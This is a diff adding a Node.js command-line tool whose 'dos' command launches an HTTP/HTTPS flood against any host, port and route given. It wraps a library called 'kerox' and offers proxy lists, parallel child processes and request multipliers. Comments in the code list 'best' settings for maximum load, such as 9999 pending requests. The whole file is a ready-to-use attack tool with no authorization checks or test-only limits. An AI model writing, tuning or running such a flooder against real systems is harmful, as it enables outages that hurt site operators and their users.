@@ -1,0 +1,163 @@
+#! /usr/bin/env node
+const fs = require("fs");
+const path = require("path");
+const yargs = require("yargs");
+const { hideBin } = require('yargs/helpers');
+
+yargs(hideBin(process.argv))
+   .command(
+      "dos <protocol> <host|ip> <port> [route]",
+      "Start a DoS attack",
+      yargs => yargs
+         // Positionals
+         .positional("protocol", {
+            describe: "Protocol to use",
+            type: "string",
+            demandOption: true
+         })
+         .positional("host", {
+            describe: "Target hostname or IP address",
+            type: "string",
+            demandOption: true
+         })
+         .positional("port", {
+            describe: "Target port",
+            type: "number",
+            demandOption: true
+         })
+         .positional("route", {
+            describe: "Target route or URL path",
+            type: "string",
+            demandOption: false
+         })
+         // Options
+         .option("proxy-list", {
+            alias: "l",
+            describe: "Path to a list of proxies",
+            type: "string",
+            requiresArg: true,
+            demandOption: false
+         })
+         .option("no-validate", {
+            alias: "n",
+            describe: "Do not test proxies and filter out invalid ones",
+            type: "boolean",
+            requiresArg: false,
+            demandOption: false
+         })
+         .option("duration", {
+            alias: "d",
+            describe: "Duration of the attack in seconds",
+            type: "number",
+            default: 60,
+            requiresArg: true,
+            demandOption: false
+         })
+         .option("max-pending", {
+            alias: "p",
+            describe: "Maximum simultaneous pending requests",
+            type: "number",
+            default: 100,
+            requiresArg: true,
+            demandOption: false
+         })
+         .option("multiplier", {
+            alias: "m",
+            describe: "Multiplier for the amount of requests sent per execution loop",
+            type: "number",
+            default: 1,
+            requiresArg: true,
+            demandOption: false
+         })
+         .option("child-processes", {
+            alias: "c",
+            describe: "Number of child processes spawned for parallel processing",
+            type: "number",
+            default: 1,
+            requiresArg: true,
+            demandOption: false
+         })
+      , (argv) => {
+         // Validate protocol
+         if (argv.protocol)
+            if (!["http", "https"].includes(argv.protocol))
+               exit("Invalid protocol: " + argv.protocol, "Supported protocols are (http, https)");
+         // Validate host
+         if (!URL.canParse(argv.protocol + "://" + argv.host) || new URL(argv.protocol + "://" + argv.host).hostname !== argv.host)
+            exit("Invalid host: " + argv.host, "Host must be a valid hostname or IP address.");
+         // Validate port
+         if (argv.port < 1 || argv.port > 65535)
+            exit("Invalid port: " + argv.port, "Port must be a number between 1 and 65535.");
+         // Validate route
+         if (argv.route)
+            if (argv.route[0] !== "/")
+               exit("Invalid route: " + argv.route, "Route must start with a forward slash.");
+         // Validate proxy-list
+         if (argv.proxyList)
+            if (!fs.existsSync(path.resolve(argv.proxyList)))
+               exit("Invalid proxy list: " + argv.proxyList, "File not found.");
+         // Validate duration
+         if (isNaN(argv.duration))
+            exit("Invalid attack duration: " + argv.duration, "Duration must be a number.");
+         else if (argv.duration < 1)
+            exit("Invalid attack duration: " + argv.duration, "Duration must be at least 1 second.");
+         // Validate max-pending
+         if (isNaN(argv.maxPending))
+            exit("Invalid max pending requests: " + argv.maxPending, "Max pending requests must be a number.");
+         else if (argv.maxPending < 1)
+            exit("Invalid max pending requests: " + argv.maxPending, "Max pending requests must be at least 1.");
+         // Validate multiplier
+         if (isNaN(argv.multiplier))
+            exit("Invalid multiplier: " + argv.multiplier, "Multiplier must be a number.");
+         else if (argv.multiplier < 1)
+            exit("Invalid multiplier: " + argv.multiplier, "Multiplier must be at least 1.");
+         // Validate child-processes
+         if (isNaN(argv.childProcesses))
+            exit("Invalid child processes: " + argv.childProcesses, "Child processes must be a number.");
+         else if (argv.childProcesses < 1)
+            exit("Invalid child processes: " + argv.childProcesses, "Child processes must be at least 1.");
+
+         // Start the attack
+         const url = argv.protocol + "://" + argv.host + ":" + argv.port + (argv.route || "");
+         const { Kerox, Status } = require("kerox");
+         const kerox = new Kerox({
+            refreshRate: 10,
+            updateInterval: 1000,
+            useProxies: !!argv.proxyList,
+            validateProxies: !argv.noValidate,
+         });
+         if (kerox.status === Status.Idle)
+            execute();
+         else
+            kerox.once("idle", execute);
+
+         function execute() {
+            kerox.ddos({
+               target: url,
+               duration: argv.duration,
+               multiplier: argv.multiplier,           // best 2
+               maxPending: argv.maxPending,           // best 9999
+               childProcesses: argv.childProcesses,   // best 4
+               // agent: { keepAlive: true },         // best null
+               dropRequests: false,                   // best false
+               display: {
+                  progressBar: true,
+                  statistics: true,
+                  httpCodes: true,
+               }
+            });
+         }
+      }
+   )
+   .strict()
+   .wrap(Math.min(120, yargs.terminalWidth()))
+   .parse();
+
+function exit(errorMessage, detailMessage) {
+   yargs.showHelp();
+   console.log();
+   console.error(errorMessage);
+   if (detailMessage)
+      console.error(detailMessage);
+   process.exit(1);
+}
